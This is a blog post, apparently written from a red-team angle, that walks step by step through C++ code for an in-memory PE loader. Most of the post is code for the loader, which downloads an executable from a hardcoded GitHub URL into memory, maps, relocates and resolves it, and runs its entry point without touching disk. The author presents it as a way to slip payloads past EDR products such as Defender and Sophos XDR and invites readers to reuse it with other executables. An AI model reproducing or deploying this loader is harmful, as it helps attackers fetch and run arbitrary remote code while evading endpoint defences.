It's high time we get another blog post going, and what better time than now to talk about PE loaders! Specifically, an In-Memory PE Loader. ðŸ˜¸  In short, we're going to implement a PE (Portable Executable) loader that downloads a PE file (in this case, `putty.exe`) from one of my Github repos.  We will then load it directly into a section of memory within the calling process and execute putty without ever writing it to disk! Essentially, we are using what's called `Dynamic Execution`: The code is able to load and execute any valid 64-bit PE file (e.g., EXE or DLL) from a remote source, in our case, a Github file URL where I simply uploaded `putty.exe` to one of my github repos.  

Not only that, but it's also loading it into the calling process that we're assuming has been loaded successfully and already passed all the familiar EDR checks.  So, EDR basically says "this executable checks out, let's let the user run it" ðŸ™‚  Now that we're on good talking terms with EDR, we then sneak in another portable executable, from memory, into our already approved/vetted process!  I've loaded various executable's using this technique, many lazily thrown together with shotty code and heavy use of syscalls, obfuscation, you name it.  I very rarely triggered EDR alerts, at least using the EDR solutions I test with.  I mainly use Defender XDR and Sophos XDR these days, though I'd like to try others at some point.  PE Loader's, especially custom made where we load the PE image from memory, are very useful for red team engagements.  Stay with me and I'll walk you through how the code is laid out!

**Here's what's happening at a high level overview:**

- The code we will be writing is an in-memory PE loader that downloads a 64-bit executable from a github URL
- We map it into memory within our existing process
- We resolve its dependencies
- Apply relocations
- Set memory protections
- Execute it!

Next, I'll walk you through the code and the thought process behind it.

***Downloading the PE***
-

```cpp
bool LoadPEInMemory(){
    // Step 1: Load PE from disk (we don't use this, but I left it so you can see how this would work if we didn't use an in-memory PE loader and loaded the PE from disk instead :) )
   /*
    HANDLE hFile = CreateFileA(pePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Cannot open PE file\n";
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileBuffer(fileSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, fileBuffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    */

    const char* agent = "Mozilla/5.0";
    const char* url = "https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/putty.exe";

    // ---- Open Internet session ----
    HINTERNET hInternet = InternetOpenA(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpenA failed: " << GetLastError() << "\n";
        return 1;
    }

    // ---- Open URL ----
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        std::cerr << "InternetOpenUrlA failed: " << GetLastError() << "\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    // ---- Read PE Executable into memory ----
    //std::vector<char> data;
    std::vector<BYTE> fileBuffer;
    char chunk[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead > 0) {
        fileBuffer.insert(fileBuffer.end(), chunk, chunk + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (fileBuffer.empty()) {
        std::cerr << "[-] Failed to download data.\n";
        return 1;
    }

```

The code begins with us leveraging the Windows Internet API (Wininet) library to download our PE file (`putty.exe`) from my hardcoded URL (https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/putty.exe), to memory.

- **InternetOpenA**: Initializes an internet session with a user-agent string (Mozilla/5.0).
- **InternetOpenUrlA**: Opens the specified URL to retrieve the file.
- **InternetReadFile**: Reads the file in chunks (4096 bytes at a time) and stores the data in a std::vector<BYTE> called fileBuffer.

**Note**: I included some commented-out code which demonstrates an alternative method to read the PE file from disk using CreateFileA and ReadFile, but the active code uses the URL-based download approach.

Now the entire PE file is stored in a byte vector called `fileBuffer`

***Parsing the PE file headers***
-

```cpp
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer.data();
PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer.data() + dosHeader->e_lfanew);
```

This section of code reads and interprets the headers of our PE file stored in the `std::vector<BYTE>` which we called `fileBuffer`, which contains the raw bytes of the PE file we downloaded ðŸ˜¸

***Allocating Memory for the PE Image***
-

```cpp
BYTE* imageBase = (BYTE*)VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (!imageBase) {
    std::cerr << "[!] VirtualAlloc failed\n";
    return false;
}
```

Now, we will allocate a block of memory in our process's address space to hold our PE file's image (the entire memory layout of the executable).  `BYTE* imageBase` will store the base address of the allocated memory, which will serve as the in-memory location of our PE image (putty.exe). ðŸ˜ƒ

***Copying the PE Headers***
-

```cpp
memcpy(imageBase, fileBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
```

This step ensures the PE headers (necessary for our PE executable's structure) are placed at the beginning of the allocated memory, mimicking how the PE would be laid out if loaded by the Windows loader.  In short, we are copying the PE file's headers from `fileBuffer` to the allocated memory at `imageBase`.

Also in case you were wondering, `ntHeaders->OptionalHeader.SizeOfHeaders` = The size of the headers to copy, which includes the DOS header, NT headers, and section headers.

***Mapping Sections***
-

```cpp
 PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
 std::cout << "[INFO] Mapping " << ntHeaders->FileHeader.NumberOfSections << " sections...\n";
 for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
     // Get section name (8 bytes, null-terminated)
     char sectionName[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };
     strncpy_s(sectionName, reinterpret_cast<const char*>(section->Name), IMAGE_SIZEOF_SHORT_NAME);

     // Calculate source and destination addresses
     BYTE* dest = imageBase + section->VirtualAddress;
     BYTE* src = fileBuffer.data() + section->PointerToRawData;

     // Print section details
     std::cout << "[INFO] Mapping section " << i + 1 << " (" << sectionName << "):\n"
         << "  - Source offset in file: 0x" << std::hex << section->PointerToRawData << "\n"
         << "  - Destination address: 0x" << std::hex << reinterpret_cast<uintptr_t>(dest) << "\n"
         << "  - Size: " << std::dec << section->SizeOfRawData << " bytes\n";

     // Copy section data
     memcpy(dest, src, section->SizeOfRawData);

     // Confirm mapping
     std::cout << "[INFO] Section " << sectionName << " mapped successfully.\n";
 }
```

This code snippet maps the sections of our 64-bit PE file using our raw data buffer (`fileBuffer`) into allocated memory (`imageBase`) to prepare for in-memory execution without writing it to disk. Specifically, we iterate through each section header in the PE file, as defined by the number of sections in the NT headers, and then we will copy each section's raw data from its file offset (`PointerToRawData`) in `fileBuffer` to its designated memory location (`imageBase + VirtualAddress`) using memcpy. This process ensures our PE file's sections (e.g., .text for code, .data for initialized data, etc) are laid out in memory according to their virtual addresses, emulating the structure the Windows loader would normally create, which is important for subsequent tasks like resolving imports, applying relocations, and executing the program.

In the screenshot below, you can see what this looks like when we map putty.exe's sections into memory:

<img width="1471" height="608" alt="image" src="https://github.com/user-attachments/assets/e28e3c3d-fd05-417a-8c37-758b1861f3bd" />

***Applying Relocations (If Necessary)***
-

```cpp
 ULONGLONG delta = (ULONGLONG)(imageBase - ntHeaders->OptionalHeader.ImageBase);
 if (delta != 0) {
     PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (relocDir->Size > 0) {
         BYTE* relocBase = imageBase + relocDir->VirtualAddress;
         DWORD parsed = 0;
         while (parsed < relocDir->Size) {
             PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)(relocBase + parsed);
             DWORD blockSize = relocBlock->SizeOfBlock;
             DWORD numEntries = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
             USHORT* entries = (USHORT*)(relocBlock + 1);

             for (DWORD i = 0; i < numEntries; ++i) {
                 USHORT typeOffset = entries[i];
                 USHORT type = typeOffset >> 12;
                 USHORT offset = typeOffset & 0x0FFF;

                 if (type == IMAGE_REL_BASED_DIR64) {
                     ULONGLONG* patchAddr = (ULONGLONG*)(imageBase + relocBlock->VirtualAddress + offset);
                     *patchAddr += delta;
                 }
             }
             parsed += blockSize;
         }
     }
 }
```

This portion of our PE loader code applies base relocations to our PE file loaded into memory at `imageBase`, ensuring that it functions correctly if allocated at a different address than its preferred base address (`ntHeaders->OptionalHeader.ImageBase`). We calculate the delta between the actual memory address (`imageBase`) and the PE file's preferred base address. If the delta is non-zero and the PE file contains a relocation table (indicated by `relocDir->Size > 0`), the code processes the relocation directory (`IMAGE_DIRECTORY_ENTRY_BASERELOC`). It iterates through relocation blocks, each containing a list of entries specifying offsets and types. For each entry with type `IMAGE_REL_BASED_DIR64` (indicating a 64-bit address relocation), it adjusts the memory address at `imageBase + VirtualAddress + offset` by adding the delta, effectively updating pointers in the PE image to reflect its actual memory location.

***Resolving Imports***
-

```cpp
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    std::cout << "[INFO] Import directory: VirtualAddress=0x" << std::hex << importDir->VirtualAddress
        << ", Size=" << std::dec << importDir->Size << " bytes\n";
    if (importDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importDir->VirtualAddress);
        while (importDesc->Name != 0) {
            char* dllName = (char*)(imageBase + importDesc->Name);
            std::cout << "[INFO] Loading DLL: " << dllName << "\n";
            HMODULE hModule = LoadLibraryA(dllName);
            if (!hModule) {
                std::cerr << "[!] Failed to load " << dllName << "\n";
                return false;
            }
            std::cout << "[INFO] DLL " << dllName << " loaded successfully at handle 0x" << std::hex << reinterpret_cast<uintptr_t>(hModule) << "\n";

            PIMAGE_THUNK_DATA64 origFirstThunk = (PIMAGE_THUNK_DATA64)(imageBase + importDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)(imageBase + importDesc->FirstThunk);

            int functionCount = 0;
            while (origFirstThunk->u1.AddressOfData != 0) {
                FARPROC proc = nullptr;
                if (origFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    WORD ordinal = origFirstThunk->u1.Ordinal & 0xFFFF;
                    std::cout << "[INFO] Resolving function by ordinal: #" << std::dec << ordinal << "\n";
                    proc = GetProcAddress(hModule, (LPCSTR)ordinal);
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + origFirstThunk->u1.AddressOfData);
                    std::cout << "[INFO] Resolving function by name: " << importByName->Name << "\n";
                    proc = GetProcAddress(hModule, importByName->Name);
                }
                if (proc) {
                    std::cout << "[INFO] Function resolved, address: 0x" << std::hex << reinterpret_cast<uintptr_t>(proc)
                        << ", writing to IAT at 0x" << reinterpret_cast<uintptr_t>(&firstThunk->u1.Function) << "\n";
                    firstThunk->u1.Function = (ULONGLONG)proc;
                    functionCount++;
                }
                else {
                    std::cerr << "[!] Failed to resolve function\n";
                }
                ++origFirstThunk;
                ++firstThunk;
            }
            std::cout << "[INFO] Resolved " << std::dec << functionCount << " functions for DLL " << dllName << "\n";
            ++importDesc;
        }
        std::cout << "[INFO] All imports resolved successfully.\n";
    }
    else {
        std::cout << "[INFO] No imports to resolve (import directory empty).\n";
    }
```

We're finally making our way to the finish line with our PE loader!  In this fairly large section of code (sorry about that, but I need me some cout << ðŸ˜¸), we will be resolving all the imports of our 64-bit PE file by processing its import directory to load required DLLs and their functions into memory. We start by accessesing the import directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`) from our PE's NT headers, and if it exists (`importDir->Size > 0`), we iterate through import descriptors. For each descriptor, we will load the specified DLL using `LoadLibraryA` and retrieve function addresses from the DLL using `GetProcAddress`, either by ordinal (if the import is by ordinal) or by name (using `PIMAGE_IMPORT_BY_NAME`). These addresses are written to the Import Address Table (IAT) at `firstThunk`, ensuring the PE file can call the required external functions. The process continues until all imports for each DLL are resolved, returning false if any DLL fails to load.  That's it in a nutshell!

Here's what this looks like when the program is running:

<img width="1043" height="405" alt="image" src="https://github.com/user-attachments/assets/65a1d8d8-611b-4d98-a6f3-1fcf6979c46e" />

***Section Memory Protection Adjustments & Calling The Entry Point***
-

```cpp
 section = IMAGE_FIRST_SECTION(ntHeaders);
 for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
     DWORD protect = 0;
     if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
         if (section->Characteristics & IMAGE_SCN_MEM_READ) protect = PAGE_EXECUTE_READ;
         if (section->Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;
     }
     else {
         if (section->Characteristics & IMAGE_SCN_MEM_READ) protect = PAGE_READONLY;
         if (section->Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;
     }
     DWORD oldProtect;
     VirtualProtect(imageBase + section->VirtualAddress, section->Misc.VirtualSize, protect, &oldProtect);
 }

 // Call entry point
 DWORD_PTR entry = (DWORD_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 auto entryPoint = (void(*)())entry;
 entryPoint();

 return true;
```

As we close out the remaining pieces of code for our PE loader, we finally make it to the portion of code that sets the appropriate memory protections based on each section's characteristics.

In short, we will need to iterate through each of our PE's file sections, starting from the first section header (`IMAGE_FIRST_SECTION(ntHeaders`)), to set appropriate memory protections based on each section's characteristics. For each of the `ntHeaders->FileHeader.NumberOfSections` sections, we check the section's flags (`section->Characteristics`). If the section is executable (`IMAGE_SCN_MEM_EXECUTE`), we assign `PAGE_EXECUTE_READ`, `PAGE_EXECUTE_READWRITE` if writable, and so on. For non-executable sections, we simply assign `PAGE_READONLY` or `PAGE_READWRITE`. Next comes the VirtualProtect function, which applies the chosen protection to the memory region specified at `imageBase + section->VirtualAddress` with size `section->Misc.VirtualSize`, storing the previous protection in oldProtect. This ensures each section (e.g., .text for code, .data for variables) has the correct permissions for execution. ðŸ˜º

Lastly, we need to call our loaded PE's entry point. We calculate our PE's entry point memory address as `imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint`, where `imageBase` is the base address of our loaded PE image and `AddressOfEntryPoint` is the offset to our PE Loader program's starting function.

***Bring it all together and make things Happen!***
-

```cpp
int main() {
    std::cout << "[INFO] Loading PE in memory...\n";
   
    if (!LoadPEInMemory()) {
        std::cerr << "[!] Failed to load PE\n";
    }
    return 0;
}
```

Oh you know what this code does ðŸ˜¸  I don't even need to explain.  But I will show a screenshot!

<img width="1277" height="986" alt="image" src="https://github.com/user-attachments/assets/2d924db5-3486-43cf-b564-8ca860d3935d" />

We did it!  So, take this code (full source code below) and try it yourself with various PE executables.  I have folks reach out to me often wondering about why their particular payload was detected by EDR.  I almost always inevitably end up encouraging them to use a PE loader, especially in memory pe loader. It really tends to help dissuade EDR detections from taking action more often than you'd think.  Disclaimer because I know someone will say IT DIDN'T WORK!  EDR DETECTED IT!  Yeah, it happens.  I'm not certifying this as foolproof FUD.  In fact I'll readily admit running this 10-20 times in a row will likely trip up EDR with an AI!ML alert because EDR solutions have AI intelligence built in these days.  It will eventually get caught if you're continually running it, or at least I'd assume it would eventually catch it. ðŸ˜„
